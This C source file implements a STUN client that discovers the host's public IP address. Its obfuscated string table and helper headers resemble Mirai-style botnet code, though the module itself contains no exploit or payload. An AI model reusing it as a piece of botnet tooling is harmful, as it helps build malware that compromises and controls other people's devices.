#define _GNU_SOURCE

#include <stdio.h>

#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>

#include "includes.h"
#include "rand.h"
#include "resolv.h"
#include "util.h"
#include "table.h"

void construct_stun_request(unsigned char *stun_request) 
{
    memset(stun_request, 0, 20);
    stun_request[0] = 0x00;  // Message Type: Binding Request
    stun_request[1] = 0x01;
    stun_request[2] = 0x00;  // Message Length: 0 (no attributes)
    stun_request[3] = 0x00;
    stun_request[4] = (MAGIC_COOKIE >> 24) & 0xFF;  // Magic Cookie
    stun_request[5] = (MAGIC_COOKIE >> 16) & 0xFF;
    stun_request[6] = (MAGIC_COOKIE >> 8) & 0xFF;
    stun_request[7] = MAGIC_COOKIE & 0xFF;

    for (int i = 8; i < 20; i++) 
    {
        stun_request[i] = rand_next() % 256;
    }
}

int parse_stun_response(unsigned char *stun_response, int len, char *ip_str) 
{
    if (len > 28 && stun_response[20] == 0x00 && stun_response[21] == 0x20) 
    {  
        int ip[4];
        for (int i = 0; i < 4; i++) 
        {
            ip[i] = stun_response[28 + i] ^ ((MAGIC_COOKIE >> (24 - 8 * i)) & 0xFF);
        }

        snprintf(ip_str, 16, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

#ifdef DEBUG
        //printf("[stun] Public network address: %s\n", ip_str);
#endif
        return 0; // Success
    } 
    else 
    {
#ifdef DEBUG
        printf("[stun] Failed to parse STUN response\n");
#endif
        return -1; // Parsing failed
    }
}

void start_stun_protocol(char *ip_buf, size_t buf_len) 
{
#ifdef DEBUG
        //printf("[stun] Parsing STUN response...\n");
#endif
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char stun_request[20];
    unsigned char stun_response[512];
    char ip_str[16];

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
    {
#ifdef DEBUG
        perror("Socket creation failed");
#endif
        snprintf(ip_buf, buf_len, enc[UNKNOWN].string);
        return;
    }

    char *stun_domain = lookup(enc[STUN_DOMAIN].string);

    if (!stun_domain) 
    {
        return;
    }

    in_addr_t addr = inet_addr(stun_domain);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(19302);
    server_addr.sin_addr.s_addr = addr;

    construct_stun_request(stun_request);
    sendto(sockfd, stun_request, sizeof(stun_request), 0,
           (const struct sockaddr *) &server_addr, sizeof(server_addr));

    socklen_t len = sizeof(server_addr);
    int n = recvfrom(sockfd, stun_response, sizeof(stun_response), 0,
                     (struct sockaddr *) &server_addr, &len);

    if (n > 0) 
    {
        if (parse_stun_response(stun_response, n, ip_str) == 0) 
        {
            snprintf(ip_buf, buf_len, "%s", ip_str);
        } 
        else 
        {
            snprintf(ip_buf, buf_len, enc[UNKNOWN].string);
        }
    } 
    else 
    {
#ifdef DEBUG
        perror("[stun] STUN response failed");
#endif
        snprintf(ip_buf, buf_len, enc[UNKNOWN].string);
    }

    close(sockfd);
}
